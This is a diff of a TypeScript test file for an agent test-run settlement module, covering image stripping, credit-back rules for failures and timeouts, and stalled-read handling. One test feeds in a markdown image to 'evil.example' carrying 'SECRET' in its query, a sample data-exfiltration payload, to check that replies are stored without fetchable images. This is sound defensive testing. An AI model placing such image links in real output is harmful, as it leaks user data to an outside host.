@@ -1,7 +1,6 @@
 import assert from 'node:assert/strict';
 import { test } from 'node:test';
 
-import { TEST_TURN_ATTEMPT_ENDED_MESSAGE } from '../src/agents/test-turn-limits.ts';
 import {
   configureInstallationAdmission,
   resetInstallationAdmissionForTests,
@@ -14,14 +13,17 @@ import {
   type RunRef,
 } from '../src/config/platform-funding.ts';
 import type { PlatformEnv } from '../src/config/state-backend.ts';
-import type { AgentConversationSnapshot } from '../src/slack/bounded-agent-observation.ts';
+import { CHICKPEA_TEST_TURN_AGENT_NAME } from '../src/agents/names.ts';
+import { agentObjectBindingName, type AgentConversationSnapshot } from '../src/slack/bounded-agent-observation.ts';
+import { withoutImages } from '../src/agents/practice-steps.ts';
 import {
   cloudflareTestRunInstancePort,
+  readSettledAgentSubmissionBounded,
   testRunSettlement,
-  withoutImages,
   type SettledAgentSubmission,
 } from '../src/state/test-run-instance.ts';
 import type { UsageMicros } from '../src/usage/usage-display.ts';
+import { acrossStalledReads, cutAgentObject } from './helpers/cut-agent-object.ts';
 import { EVERY_PROVIDER_FUNDED, NO_RUN_FEES } from './helpers/platform-funding.ts';
 
 function answered(text: string): SettledAgentSubmission {
@@ -51,22 +53,19 @@ test('a reply leaves the store with no image a client would fetch: each is its a
 
 test('an answered run stores its reply without images', () => {
   const settled = testRunSettlement(answered(' Two tickets. ![](https://evil.example/p?d=SECRET) '), 'sub_1', undefined);
-  assert.deepEqual(settled, { kind: 'answered', reply: 'Two tickets. https://evil.example/p?d=SECRET', read: [] });
+  assert.deepEqual(settled, { kind: 'answered', reply: 'Two tickets. https://evil.example/p?d=SECRET', read: [], skills: [], steps: [] });
 });
 
-test('an attempt the 25-call limit ended is a failure that is not credited back; another agent failure is', () => {
-  const ended = (error: unknown) => testRunSettlement({ outcome: 'failed', error }, 'sub_1', undefined);
-  // As Flue settles it (tests/run-fees-flue.test.ts reads the real one).
-  assert.deepEqual(ended({
-    name: 'FlueError', type: 'operation_failed', message: `dispatch(sub_1) failed: ${TEST_TURN_ATTEMPT_ENDED_MESSAGE}`,
-    meta: { operation: 'dispatch(sub_1)', reason: TEST_TURN_ATTEMPT_ENDED_MESSAGE },
-  }), { kind: 'failed', failure: 'failed', creditBack: null });
-  assert.deepEqual(ended({ message: 'The attempt failed.', cause: { message: TEST_TURN_ATTEMPT_ENDED_MESSAGE } }),
-    { kind: 'failed', failure: 'failed', creditBack: null });
-  // Flue's reason is matched exactly, even if its message prefix changes.
-  assert.deepEqual(ended({ name: 'FlueError', message: 'Operation failed.', meta: { reason: TEST_TURN_ATTEMPT_ENDED_MESSAGE } }),
-    { kind: 'failed', failure: 'failed', creditBack: null });
-  assert.deepEqual(ended({ message: 'The agent threw.' }), { kind: 'failed', failure: 'failed', creditBack: 'chickpea' });
+test('an agent failure is credited back, as a direct message\'s is', () => {
+  const failed = (error: unknown) => testRunSettlement({ outcome: 'failed', error }, 'sub_1', undefined);
+  assert.deepEqual(failed({ message: 'The agent threw.' }), { kind: 'failed', failure: 'failed', creditBack: 'chickpea' });
+});
+
+test('a run Flue timed out, or one aborted, is a deadline credited back as a timeout', () => {
+  // The usual timeout: Flue ends the submission at its own durability's timeout, before the store's deadline.
+  assert.deepEqual(testRunSettlement({ outcome: 'failed', error: { type: 'submission_timeout', message: 'The submission timed out.' } }, 'sub_1', undefined),
+    { kind: 'failed', failure: 'deadline', creditBack: 'timeout' });
+  assert.deepEqual(testRunSettlement({ outcome: 'aborted' }, 'sub_1', undefined), { kind: 'failed', failure: 'deadline', creditBack: 'timeout' });
 });
 
 test('a test run is credited back as a direct message is: never while its installation is suspended or ended', async (t) => {
@@ -96,4 +95,29 @@ test('a test run is credited back as a direct message is: never while its instal
   configureInstallationAdmission(async () => 'admitted');
   await port.creditBack('sub_admitted', 'chickpea');
   assert.deepEqual(credits, [{ run: { installationId: 'inst_credit', runId: 'sub_admitted' }, reason: 'chickpea' }]);
+});
+
+// Defects caught: the settlement read joining a stalled read through the stub
+// that stalled, and the reply read through it after a new stub answered.
+test('a stalled settlement read is joined through a new stub, which also reads the reply', async (t) => {
+  const history = {
+    v: 1,
+    conversationId: 'conv_1',
+    offset: '0_9',
+    messages: [
+      { id: 'm_user', role: 'user', parts: [{ type: 'text', text: 'How many tickets?' }] },
+      { id: 'm_reply', role: 'assistant', submissionId: 'sub_1', parts: [{ type: 'text', text: 'Two tickets.' }] },
+    ],
+    settlements: [{ submissionId: 'sub_1', outcome: 'completed' }],
+  };
+  const agentObject = cutAgentObject((request) => new URL(request.url).searchParams.get('view') === 'history'
+    ? Response.json(history)
+    : Response.json([{ type: 'stream-checkpoint' }, { type: 'submission-settled', submissionId: 'sub_1', outcome: 'completed' }]));
+  const settled = await acrossStalledReads(t, () => readSettledAgentSubmissionBounded(
+    { [agentObjectBindingName(CHICKPEA_TEST_TURN_AGENT_NAME)]: agentObject.namespace },
+    { agentName: CHICKPEA_TEST_TURN_AGENT_NAME, instanceId: 'agent_1', submissionId: 'sub_1' },
+  ));
+  assert.equal(settled?.outcome, 'completed');
+  assert.equal(settled?.completed?.reply.text, 'Two tickets.');
+  assert.equal(agentObject.stubs(), 2);
 });
